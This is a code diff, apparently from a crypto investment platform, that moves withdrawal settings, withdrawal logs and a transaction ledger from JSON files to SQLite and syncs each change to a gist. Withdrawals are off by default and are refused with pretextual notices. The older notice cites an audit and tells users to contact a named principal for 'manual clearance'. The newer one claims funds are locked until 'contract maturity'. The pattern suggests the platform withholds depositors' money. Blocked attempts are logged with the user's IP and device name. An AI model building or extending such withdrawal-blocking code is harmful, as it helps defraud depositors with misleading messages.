@@ -1,5 +1,7 @@
+import db from '@/lib/db';
 import fs from 'fs/promises';
 import path from 'path';
+import { queueGistPush } from '@/lib/db/gistClient';
 
 export interface AdminWithdrawalConfig {
   enabled: boolean;
@@ -57,16 +59,11 @@ export interface TransactionLedgerRecord {
   note?: string;
 }
 
-const DATA_DIR = path.join(process.cwd(), 'data');
-const ADMIN_CONFIG_FILE = path.join(DATA_DIR, 'admin-config.json');
-const WITHDRAWALS_FILE = path.join(DATA_DIR, 'withdrawals.json');
-const TRANSACTIONS_FILE = path.join(DATA_DIR, 'transactions.json');
-
 const DEFAULT_ADMIN_CONFIG: AdminConfigFile = {
   withdrawals: {
     enabled: false,
     lockMessage:
-      'Withdrawal window currently closed for quarterly asset rebalancing and cryptographic audit (ERR-WTH-88429-CLOSED). Contact portfolio principal Declan Salo for manual clearance.',
+      'Capital disbursements are locked until full contract maturity. Early releases cannot be processed prior to the scheduled contract end date. Please refer to your portfolio terms for details.',
     minAmount: 1000,
     maxAmount: 5000000,
     allowedRails: {
@@ -88,17 +85,26 @@ const DEFAULT_ADMIN_CONFIG: AdminConfigFile = {
 };
 
 // -----------------------------------------------------------------
-// Admin Config Helpers
+// Admin Config Helpers (SQLite Powered)
 // -----------------------------------------------------------------
 export async function getAdminConfig(): Promise<AdminConfigFile> {
   try {
-    const raw = await fs.readFile(ADMIN_CONFIG_FILE, 'utf-8');
-    return JSON.parse(raw) as AdminConfigFile;
-  } catch {
-    await fs.mkdir(DATA_DIR, { recursive: true });
-    await fs.writeFile(ADMIN_CONFIG_FILE, JSON.stringify(DEFAULT_ADMIN_CONFIG, null, 2), 'utf-8');
-    return DEFAULT_ADMIN_CONFIG;
-  }
+    const row = db.prepare('SELECT value, updated_at FROM admin_settings WHERE key = ?').get('withdrawals') as {
+      value: string;
+      updated_at: number;
+    } | undefined;
+
+    if (row && row.value) {
+      const parsedWithdrawals = JSON.parse(row.value) as AdminWithdrawalConfig;
+      return {
+        ...DEFAULT_ADMIN_CONFIG,
+        withdrawals: parsedWithdrawals,
+        lastUpdated: row.updated_at,
+      };
+    }
+  } catch {}
+
+  return DEFAULT_ADMIN_CONFIG;
 }
 
 export async function updateAdminConfig(
@@ -121,18 +127,47 @@ export async function updateAdminConfig(
     updatedBy: userId,
   };
 
-  await fs.mkdir(DATA_DIR, { recursive: true });
-  await fs.writeFile(ADMIN_CONFIG_FILE, JSON.stringify(merged, null, 2), 'utf-8');
+  try {
+    db.prepare(`
+      INSERT INTO admin_settings (key, value, updated_at)
+      VALUES (?, ?, ?)
+      ON CONFLICT(key) DO UPDATE SET
+        value = excluded.value,
+        updated_at = excluded.updated_at
+    `).run('withdrawals', JSON.stringify(merged.withdrawals), merged.lastUpdated);
+
+    queueGistPush();
+  } catch (e: any) {
+    console.error('Error updating admin settings in SQLite:', e);
+  }
+
   return merged;
 }
 
 // -----------------------------------------------------------------
-// Withdrawals Logging & Management
+// Withdrawals Logging & Audit (SQLite Powered)
 // -----------------------------------------------------------------
 export async function getWithdrawalRequests(): Promise<WithdrawalRequestRecord[]> {
   try {
-    const raw = await fs.readFile(WITHDRAWALS_FILE, 'utf-8');
-    return JSON.parse(raw) as WithdrawalRequestRecord[];
+    const rows = db.prepare(`
+      SELECT id, timestamp, amount, rail, beneficiary, destination, status, status_reason, ip_address, device_name
+      FROM withdrawal_requests
+      ORDER BY timestamp DESC
+      LIMIT 100
+    `).all() as any[];
+
+    return rows.map((r) => ({
+      id: r.id,
+      timestamp: r.timestamp,
+      amount: r.amount,
+      rail: r.rail,
+      beneficiary: r.beneficiary,
+      destination: r.destination,
+      status: r.status,
+      statusReason: r.status_reason,
+      ipAddress: r.ip_address,
+      deviceName: r.device_name,
+    }));
   } catch {
     return [];
   }
@@ -141,16 +176,35 @@ export async function getWithdrawalRequests(): Promise<WithdrawalRequestRecord[]
 export async function logWithdrawalAttempt(
   data: Omit<WithdrawalRequestRecord, 'id' | 'timestamp'>
 ): Promise<WithdrawalRequestRecord> {
-  const list = await getWithdrawalRequests();
   const record: WithdrawalRequestRecord = {
     ...data,
     id: `wth_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
     timestamp: Date.now(),
   };
 
-  list.unshift(record);
-  await fs.mkdir(DATA_DIR, { recursive: true });
-  await fs.writeFile(WITHDRAWALS_FILE, JSON.stringify(list.slice(0, 100), null, 2), 'utf-8');
+  try {
+    db.prepare(`
+      INSERT INTO withdrawal_requests
+      (id, timestamp, amount, rail, beneficiary, destination, status, status_reason, ip_address, device_name)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `).run(
+      record.id,
+      record.timestamp,
+      record.amount,
+      record.rail,
+      record.beneficiary,
+      record.destination,
+      record.status,
+      record.statusReason || null,
+      record.ipAddress || null,
+      record.deviceName || null
+    );
+
+    queueGistPush();
+  } catch (e) {
+    console.error('Failed to log withdrawal in SQLite:', e);
+  }
+
   return record;
 }
 
@@ -159,24 +213,49 @@ export async function updateWithdrawalStatus(
   status: 'pending' | 'blocked' | 'approved' | 'rejected',
   reason?: string
 ): Promise<boolean> {
-  const list = await getWithdrawalRequests();
-  const item = list.find((w) => w.id === id);
-  if (!item) return false;
+  try {
+    const info = db.prepare(`
+      UPDATE withdrawal_requests
+      SET status = ?, status_reason = ?
+      WHERE id = ?
+    `).run(status, reason || null, id);
 
-  item.status = status;
-  if (reason) item.statusReason = reason;
-
-  await fs.writeFile(WITHDRAWALS_FILE, JSON.stringify(list, null, 2), 'utf-8');
-  return true;
+    if (info.changes > 0) {
+      queueGistPush();
+      return true;
+    }
+    return false;
+  } catch {
+    return false;
+  }
 }
 
 // -----------------------------------------------------------------
-// Transactions Ledger
+// Transactions Ledger (SQLite Powered)
 // -----------------------------------------------------------------
 export async function getTransactionsLedger(): Promise<TransactionLedgerRecord[]> {
   try {
-    const raw = await fs.readFile(TRANSACTIONS_FILE, 'utf-8');
-    return JSON.parse(raw) as TransactionLedgerRecord[];
+    const rows = db.prepare(`
+      SELECT id, timestamp, type, asset, network, amount, tx_id, status, confirmations, vault_address, credited, note
+      FROM transaction_ledger
+      ORDER BY timestamp DESC
+      LIMIT 100
+    `).all() as any[];
+
+    return rows.map((r) => ({
+      id: r.id,
+      timestamp: r.timestamp,
+      type: r.type,
+      asset: r.asset,
+      network: r.network,
+      amount: r.amount,
+      txId: r.tx_id,
+      status: r.status,
+      confirmations: r.confirmations,
+      vaultAddress: r.vault_address,
+      credited: r.credited === 1,
+      note: r.note,
+    }));
   } catch {
     return [];
   }
@@ -185,15 +264,34 @@ export async function getTransactionsLedger(): Promise<TransactionLedgerRecord[]
 export async function recordLedgerTransaction(
   record: Omit<TransactionLedgerRecord, 'id' | 'timestamp'>
 ): Promise<TransactionLedgerRecord> {
-  const list = await getTransactionsLedger();
   const item: TransactionLedgerRecord = {
     ...record,
     id: `tx_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
     timestamp: Date.now(),
   };
 
-  list.unshift(item);
-  await fs.mkdir(DATA_DIR, { recursive: true });
-  await fs.writeFile(TRANSACTIONS_FILE, JSON.stringify(list.slice(0, 100), null, 2), 'utf-8');
+  try {
+    db.prepare(`
+      INSERT INTO transaction_ledger
+      (id, timestamp, type, asset, network, amount, tx_id, status, confirmations, vault_address, credited, note)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `).run(
+      item.id,
+      item.timestamp,
+      item.type,
+      item.asset,
+      item.network || null,
+      item.amount,
+      item.txId || null,
+      item.status,
+      item.confirmations || 0,
+      item.vaultAddress || null,
+      item.credited ? 1 : 0,
+      item.note || null
+    );
+  } catch (e) {
+    console.error('Failed to record ledger transaction in SQLite:', e);
+  }
+
   return item;
 }
